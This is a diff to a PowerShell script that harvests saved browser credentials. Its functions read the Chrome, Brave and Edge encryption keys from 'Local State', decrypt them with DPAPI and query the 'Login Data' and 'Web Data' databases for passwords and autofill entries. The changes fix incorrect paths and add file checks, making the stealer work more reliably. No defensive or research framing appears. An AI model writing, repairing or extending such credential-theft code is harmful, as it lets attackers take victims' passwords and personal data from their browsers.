@@ -1,12 +1,20 @@
 # Function to decrypt Chrome passwords
 function Get-ChromePasswords {
     try {
-        $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\AutofillStates\2020.11.2.164946\_metadata\verified_contents"
+        $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
+        if (-not (Test-Path $localStatePath)) {
+            Write-Output "Chrome local state file not found."
+            return @()
+        }
         $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
         $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
         $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\AutofillStates\2020.11.2.164946\_metadata\verified_contents"
+        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+        if (-not (Test-Path $dbPath)) {
+            Write-Output "Chrome login data file not found."
+            return @()
+        }
         $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
         $dbConnection.Open()
         $cmd = $dbConnection.CreateCommand()
@@ -36,6 +44,10 @@ function Get-ChromePasswords {
 function Get-ChromeAutofill {
     try {
         $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data"
+        if (-not (Test-Path $dbPath)) {
+            Write-Output "Chrome web data file not found."
+            return @()
+        }
         $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
         $dbConnection.Open()
         $cmd = $dbConnection.CreateCommand()
@@ -60,11 +72,19 @@ function Get-ChromeAutofill {
 function Get-BravePasswords {
     try {
         $localStatePath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
+        if (-not (Test-Path $localStatePath)) {
+            Write-Output "Brave local state file not found."
+            return @()
+        }
         $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
         $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
         $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
         $dbPath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+        if (-not (Test-Path $dbPath)) {
+            Write-Output "Brave login data file not found."
+            return @()
+        }
         $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
         $dbConnection.Open()
         $cmd = $dbConnection.CreateCommand()
@@ -94,6 +114,10 @@ function Get-BravePasswords {
 function Get-BraveAutofill {
     try {
         $dbPath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
+        if (-not (Test-Path $dbPath)) {
+            Write-Output "Brave web data file not found."
+            return @()
+        }
         $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
         $dbConnection.Open()
         $cmd = $dbConnection.CreateCommand()
@@ -161,11 +185,19 @@ function Get-FirefoxPasswords {
 function Get-EdgePasswords {
     try {
         $localStatePath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Local State"
+        if (-not (Test-Path $localStatePath)) {
+            Write-Output "Edge local state file not found."
+            return @()
+        }
         $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
         $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
         $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
         $dbPath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
+        if (-not (Test-Path $dbPath)) {
+            Write-Output "Edge login data file not found."
+            return @()
+        }
         $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
         $dbConnection.Open()
         $cmd = $dbConnection.CreateCommand()
@@ -195,6 +227,10 @@ function Get-EdgePasswords {
 function Get-EdgeAutofill {
     try {
         $dbPath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data"
+        if (-not (Test-Path $dbPath)) {
+            Write-Output "Edge web data file not found."
+            return @()
+        }
         $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
         $dbConnection.Open()
         $cmd = $dbConnection.CreateCommand()
